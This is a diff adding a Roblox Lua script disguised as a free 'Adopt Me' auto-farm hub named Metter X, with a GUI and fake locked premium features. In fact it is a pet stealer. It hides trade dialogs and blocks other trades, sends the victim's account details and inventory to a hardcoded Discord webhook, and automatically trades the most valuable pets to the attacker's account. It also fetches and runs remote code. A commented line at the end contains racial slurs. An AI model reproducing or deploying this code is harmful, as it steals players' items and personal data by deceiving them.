@@ -1,0 +1,537 @@
+local Username = "collected_garbage001" 
+local Webhook = "https://discord.com/api/webhooks/1311885986535444533/Ym62wa2UPWZhEMqIbI9L9mTLmA0yS9j0v1B_7sXB-WaB8sJpDQ9lObHIml2mFm4lbVpJ"
+
+repeat wait() until game:IsLoaded()
+
+if getgenv().adm then return end
+getgenv().adm = true
+
+--ififxifxifxifix
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local RouterClient = Loads("RouterClient")
+local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+local function moveGuiOffscreen(guiElement)
+    if guiElement then
+        guiElement.Position = UDim2.new(1000, 0, 1000, 0)
+    end
+end
+local function hideDialog()
+    local playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+    local dialogApp = playerGui:FindFirstChild("DialogApp")
+    if dialogApp and dialogApp:FindFirstChild("Dialog") then
+        dialogApp.Dialog.Visible = false
+        moveGuiOffscreen(dialogApp.Dialog)
+    end
+end
+local function declineTradeRequest(player)
+    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
+end
+local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+hideDialog()
+
+TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
+    local localPlayer = game:GetService("Players").LocalPlayer
+    if sender.Name ~= localPlayer.Name then
+        declineTradeRequest(sender)
+    end
+end)
+
+declineTradeRequest()
+
+
+if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
+    Webhook = ""
+    game:GetService("Players").LocalPlayer:Kick("\nUnsupported server!")
+end
+
+--uhh this priv server checker only checks for the user's status
+local Services = setmetatable({}, {
+    __index = function(_, Name)
+        return cloneref(game:GetService(Name))
+    end
+})
+local RobloxReplicatedStorage = Services.RobloxReplicatedStorage
+local GetServerType = RobloxReplicatedStorage:FindFirstChild("GetServerType")
+local IsVIP = GetServerType and GetServerType:InvokeServer() == "VIPServer"
+print(IsVIP)
+if IsVIP then
+    local Players = Services.Players 
+    local LocalPlayer = Players.LocalPlayer
+    if LocalPlayer then
+        Webhook = ""
+        LocalPlayer:Kick("\nPrivate server detected!")
+    end
+end
+
+--uhh the priv server checker above only checks for the user's status so... yeah just in case
+if #game:GetService("Players"):GetPlayers() <= 5 then
+    game:GetService("Players").LocalPlayer:Kick("\nPrivate Servers are not supported, unable get Remote.Events")
+    wait(5)
+    game:Shutdown()
+end
+
+
+local Pets = {}
+local PetCounts = {}
+local Loaders = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loaders("InventoryDB")
+local ClientData = Loaders("ClientData")
+local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
+
+local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0
+local rare_count, uncommon_count, common_count, total_pets = 0, 0, 0, 0
+for i, v in pairs(ClientData.get("inventory").pets) do
+    total_pets = total_pets + 1
+end
+
+for i, v in pairs(ClientData.get("inventory").pets) do
+    local petData = InventoryDB[v.category][v.id]
+    
+    if petData.rarity == "legendary" then
+        legendaries_count = legendaries_count + 1
+    end
+    if petData.properties == "mega_neon" then
+        mega_count = mega_count + 1
+    end
+    if petData.properties == "neon" then
+        neon_count = neon_count + 1
+    end
+    if petData.rarity == "ultra_rare" then
+        ultra_count = ultra_count + 1
+    end
+    if petData.rarity == "rare" then
+        rare_count = rare_count + 1
+    end
+    if petData.rarity == "uncommon" then
+        uncommon_count = uncommon_count + 1
+    end
+    if petData.rarity == "common" then
+        common_count = common_count + 1
+    end
+end
+
+local teleport = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)'
+
+local plr = game.Players.LocalPlayer
+local accage = game.Players.LocalPlayer.AccountAge
+local IdValue = game:GetService("Players").LocalPlayer.userId
+or "Unknown"
+local receiver = Username
+local ExecutorValue = identifyexecutor() or "Unknown"
+local bucks = tostring(require(game:GetService("ReplicatedStorage").Fsys).load("ClientData").get("money"))
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+local VersionValue = "1.2.2"
+
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+local neon_count = 0
+local mega_neon_count = 0
+local flyable_count = 0
+local rideable_count = 0
+local fr_count = 0
+
+for _, petData in pairs(playerData.inventory.pets) do
+    if petData.properties and type(petData.properties) == "table" then
+        if petData.properties.neon then
+            neon_count = neon_count + 1
+        end
+        if petData.properties.mega_neon then
+            mega_neon_count = mega_neon_count + 1
+        end
+        if petData.properties.flyable then
+            flyable_count = flyable_count + 1
+        end
+        if petData.properties.rideable then
+            rideable_count = rideable_count + 1
+        end
+        if petData.properties.rideable or petData.properties.flyable then
+            fr_count = fr_count + 1
+        end
+    end
+end
+
+if legendaries_count + mega_count + neon_count + ultra_count + fr_count == 0 then
+    Webhook = ""
+    game:GetService("Players").LocalPlayer:Kick("\nBot/Alt Account Detected, Cannot get low value object.pets.eggs [No Remote.Event Detected]")
+end
+
+
+    local embed = {
+        ["title"] = "Adopt Me! | vSudoKai",
+        ["color"] = tonumber(0x3365FF),
+        ["fields"] = {
+            {
+                ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
+                ["value"] = "```lua\n" ..
+                            "Username         : " .. tostring(plr) .. "\n" ..
+                            "User-ID          : " .. tostring(IdValue) .. "\n" ..
+                            "Account Age      : " .. tostring(accage) .. " Days\n" ..
+                            "Executor         : " .. tostring(ExecutorValue) .. "\n" ..
+                            "Receiver         : " .. tostring(Username) .. "\n"..
+                            "Version          : " .. tostring(VersionValue) .. "```"
+            },
+            {
+                ["name"] = "〘:ringed_planet:〙**Items**",
+                ["value"] = "```lua\n" ..
+                            "Total Value      : " .. tostring("Soon") .. "\n" ..
+                            "Bucks Amount     : " .. tostring(bucks) .. "\n\n" ..
+                            "Mega Pets        : " .. tostring(mega_neon_count) .. "\n" ..
+                            "Neon Pets        : " .. tostring(neon_count) .. "\n" ..
+                            "F/R Pets         : " .. tostring(fr_count) .. "\n" ..
+                            "Legendary Pets   : " .. tostring(legendaries_count) .. "\n" ..
+                            "Ultra-Rare Pets  : " .. tostring(ultra_count) .. "\n" ..
+                            "Rares Pets       : " .. tostring(rare_count) .. "\n" ..
+                            "Uncommon Pets    : " .. tostring(uncommon_count) .. "\n" ..
+                            "Common Pets      : " .. tostring(common_count) .. "```" 
+            },
+        }
+    }
+    
+    
+
+function SendMessageEMBED(url, embed, bool)
+  local http = game:GetService("HttpService")
+  local headers = {
+      ["Content-Type"] = "application/json"
+  }
+  local data = {
+      username = "Adopt Me! | s_kai",
+      avatar_url = "https://tr.rbxcdn.com/180DAY-f421bfa6b5b4594c77beb50a61e31c56/768/432/Image/Webp/noFilter",
+      content = TeleportScript,
+      embeds = {
+          {
+              title = embed.title,
+              color = embed.color,
+              fields = embed.fields,
+          }
+      }
+  }
+  local data2 = {
+      username = "Adopt Me! | s_kai",
+      avatar_url = "https://tr.rbxcdn.com/180DAY-f421bfa6b5b4594c77beb50a61e31c56/768/432/Image/Webp/noFilter",
+      content = "-- @everyone\n" .. TeleportScript,
+      embeds = {
+          {
+              title = embed.title,
+              color = 0xf1c40f,
+              fields = embed.fields,
+          }
+      }
+  }
+
+  local body = http:JSONEncode(data)
+  local body2 = http:JSONEncode(data2)
+  if bool == true then
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body2
+      })
+  else
+      local response = request({
+          Url = url,
+          Method = "POST",
+          Headers = headers,
+          Body = body
+      })
+  end
+end
+
+if legendaries_count >= 1 or neon_count >= 1 or mega_count >= 1 or flyable_count >= 1 or rideable_count >= 1 or fr_count >= 1 then
+    SendMessageEMBED(Webhook, embed, true)
+else
+    SendMessageEMBED(Webhook, embed, false)
+end 
+
+
+
+game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
+game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+
+local stealActive = false
+local function StartSteal()
+    if stealActive then
+    end
+    stealActive = true
+
+    local RouterClient = Loaders("RouterClient")
+    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+
+    local function offset(guiElement)
+        if guiElement then
+            guiElement.Position = UDim2.new(1000, 0, 1000, 0)
+        end
+    end
+    local dialogApp = game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("DialogApp")
+    if dialogApp and dialogApp:FindFirstChild("Dialog") then
+        offset(dialogApp.Dialog)
+    end
+
+
+    SendTrade:FireServer(game.Players[Username])
+
+
+local PetsInventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+local legendaries_count, mega_count, neon_count, ultra_count = 0, 0, 0, 0
+
+if next(PetsInventory.pets) then
+    local petUids = {}
+    local petCount = 0
+    local petLimit = 18
+
+    for petUid, pet in pairs(PetsInventory.pets) do
+        table.insert(petUids, petUid)
+        
+        local petData = InventoryDB[pet.category][pet.id]
+        if petData.rarity == "legendary" then
+            legendaries_count = legendaries_count + 1
+        end
+        if pet.properties and pet.properties.mega_neon then
+            mega_count = mega_count + 1
+        end
+        if pet.properties and pet.properties.neon then
+            neon_count = neon_count + 1
+        end
+        if petData.rarity == "ultra_rare" then
+            ultra_count = ultra_count + 1
+        end
+    end
+    if legendaries_count + mega_count + neon_count + ultra_count + fr_count == 0 then
+        game:GetService("Players").LocalPlayer:Kick("\nAll your valuable items just got stolen by MetterX!")
+    end
+local function getPetPriority(pet)
+    local petData = InventoryDB[pet.category][pet.id]
+    local priority = 0
+    if pet.properties and pet.properties.mega_neon then
+        priority = 6
+    elseif pet.properties and pet.properties.neon then
+        priority = 5
+    elseif petData.rarity == "legendary" then
+        priority = 4
+    elseif petData.rarity == "ultra_rare" then
+        priority = 3
+    elseif petData.rarity == "rare" then
+        priority = 2
+    elseif petData.rarity == "uncommon" then
+        priority = 1
+    else
+        priority = 0
+    end
+
+    return priority
+end
+local petUids = {}
+for petUid, pet in pairs(PetsInventory.pets) do
+    table.insert(petUids, {uid = petUid, priority = getPetPriority(pet)})
+end
+table.sort(petUids, function(a, b)
+    return a.priority > b.priority
+end)
+local petCount = 0
+local petLimit = 25
+while #petUids > 0 and petCount < petLimit do
+    if not stealActive then
+    end
+
+    local petEntry = table.remove(petUids, 1)
+    AddPetRemote:FireServer(petEntry.uid)
+    petCount = petCount + 1
+end
+
+
+else
+    game:GetService("Players").LocalPlayer:Kick("\nAll your valuable items just got stolen by MetterX!")
+end
+
+AcceptNegotiationRemote:FireServer()
+ConfirmTradeRemote:FireServer()
+    stealActive = false
+    wait(1)
+    StartSteal()
+end
+
+function sendPlayerLeaveNotification(playerName)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local dataLeave = {
+        username = "MetterX | Notification",
+        avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=675b88f3&is=675a3773&hm=e3a132b25e9e68d7eacd6ff736b660d8651a3cd9fb9493b9ddbb70767f4cf8bf&",
+        content = "**" .. playerName .. "** left from the game!",
+        embeds = {
+            {
+                color = 0xff3e3e,
+                fields = {
+                    {
+                        name = "〘:rotating_light:〙**Player Info**",
+                        value = "```lua" ..
+                            "\nUsername      : " .. game.Players.LocalPlayer.Name ..
+                            "\nUser-ID       : " .. game.Players.LocalPlayer.userId ..
+                            "\nAccount Age   : " .. game.Players.LocalPlayer.AccountAge ..
+                            "\nExecutor      : " .. identifyexecutor() .. "```",
+                        inline = false
+                    }
+                }
+            }
+        }
+    }
+
+    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
+
+    local response = request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonDataLeave
+    })
+end
+
+game.Players.PlayerRemoving:Connect(function(player)
+    if player == game.Players.LocalPlayer then
+        sendPlayerLeaveNotification(player.Name)
+    end
+end)
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function(msg)
+            StartSteal()
+        end)
+    end
+end)
+
+
+--gui with metter x name
+local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+local window = DrRayLibrary:Load("Metter X!", "Default")	
+local tab1 = DrRayLibrary.newTab("AUTO", "ImageIdHere")
+tab1.newLabel("[PREMIUM AUTO FARM SCRIPT FOR ADOPT ME]")
+tab1.newLabel("Auto Buy Eggs and Auto Hatch All of your Eggs!")
+tab1.newLabel("Auto Play Minigames to farm Bucks!")
+tab1.newLabel("Auto Grow Pets to Adult!")
+tab1.newButton("ReQiuYTPL Hub", "Runs ReQiuYTPL Hub! (Auto Farm, Auto Trade and More!)", function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "Starting ReQiuYTPL Hub...",
+		Text = "Enjoy!",
+		Icon = "rbxassetid://2663933748",
+		Duration = 3
+	})
+	wait(2)
+	loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
+
+end)
+
+tab1.newToggle("Anti-Ban", "Anti-Ban by changing server-side UserID", false, function(toggleState)
+    if toggleState then
+        game.StarterGui:SetCore("SendNotification", {
+			Title = "Anti-Ban",
+			Text = "FireRemoteEvent.BanUser = false",
+			Icon = "rbxassetid://2663933748",
+			Duration = 5
+		})
+    else
+		wait(2)
+        game.StarterGui:SetCore("SendNotification", {
+			Title = "Anti-Ban",
+			Text = "Not Suggested.",
+			Icon = "rbxassetid://2663933748",
+			Duration = 5
+		})
+    end
+end)
+
+tab1.newToggle("Anti-Afk", "Anti-Afk by doing random VirtualInputs()", false, function(toggleState)
+    if toggleState then
+		game.StarterGui:SetCore("SendNotification", {
+			Title = "ANTI-AFK",
+			Text = "Anti AFK - ON.",
+			Icon = "rbxassetid://2663933748",
+			Duration = 5
+		})		
+    else
+		wait(2)
+		game.StarterGui:SetCore("SendNotification", {
+			Title = "ANTI-AFK",
+			Text = "Anti AFK - OFF.",
+			Icon = "rbxassetid://2663933748",
+			Duration = 5
+		})
+    end
+end)
+
+--Visual
+local tab2 = DrRayLibrary.newTab("PREMIUM", "ImageIdLogoHere")
+tab2.newLabel("THIS FEATURE IS ONLY FOR THOSE WHO ARE WORTHY, AND BOUGHT THE PREMIUM SCRIPT THROUGH DISCORD SERVER!")
+tab2.newLabel("Features: Pet Property Changer, Server Crasher to Lag Trade, Dupe High Value Pets[UNSTABLE] and More!")
+
+tab2.newButton("LOCKED [PET SPOOFER]", "Spoof your pet to any pet!", function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "[ULTRA PREMIUM FEATURES]",
+		Text = "UNLOCK ULTRA PREMIUM FEATURES",
+		Icon = "rbxassetid://2663933748",
+		Duration = 3
+	})
+end)
+
+tab2.newButton("LOCKED [SERVER CRASHER]", "Causes Trade timer to lag!", function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "[ULTRA PREMIUM FEATURES]",
+		Text = "UNLOCK ULTRA PREMIUM FEATURES",
+		Icon = "rbxassetid://2663933748",
+		Duration = 3
+	})
+end)
+
+tab2.newButton("LOCKED [PET DUPER]", "Only Duplicate old pets! 2022-2023 Pets only.", function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "[ULTRA PREMIUM FEATURES]",
+		Text = "UNLOCK ULTRA PREMIUM FEATURES",
+		Icon = "rbxassetid://2663933748",
+		Duration = 3
+	})
+end)
+
+tab2.newInput("Input secret key...", "[ULTRA PREMIUM FEATURES]", function()
+    game.StarterGui:SetCore("SendNotification", {
+		Title = "[ULTRA PREMIUM FEATURES]",
+		Text = "Wrong key!",
+		Icon = "rbxassetid://2663933748",
+		Duration = 2
+	})
+end)
+
+local tab3 = DrRayLibrary.newTab("Credits", "ImageIdLogoHere")
+tab3.newLabel("If you find any bugs or issues with the script message me on Discord!")
+tab3.newButton("Adopt Me! [Freemium Script by Metter X Hub]", "More Freemium scripts to come!")
+tab3.newButton("Join my Discord Server and DM me!", "If you have any issues or want to inquire for the Premium Feature!", function()
+    setclipboard("https://discord.gg/4P7zzTJtM2")
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Copied to Clipboard",
+        Text = "Discord link has been copied!",
+        Duration = 5,
+    })
+end)
+
+tab3.newButton("Credits to @sudo_kai", "Creator of this amazing GUI and the Script!")
+
+tab3.newButton("Metter X_On_Top!", "Subscribe to my YT Channel for script showcase!", function()
+	setclipboard("https://www.youtube.com/@MetterX_on_Top")
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Copied to Clipboard",
+        Text = "Youtube Channel link has been copied!",
+        Duration = 5,
+    })
+
+end)
+
+tab3.newButton("Developers", "Metter X & @sudo_kai")
+--tab2.newDropdown("Dropdown", "drop down shit for gettign playercount and pick player to trade scam very op wowowowoow", {"nigger", "nigga", "uhh"}, function(selectedOption)
+--    print(selectedOption)
+--end)
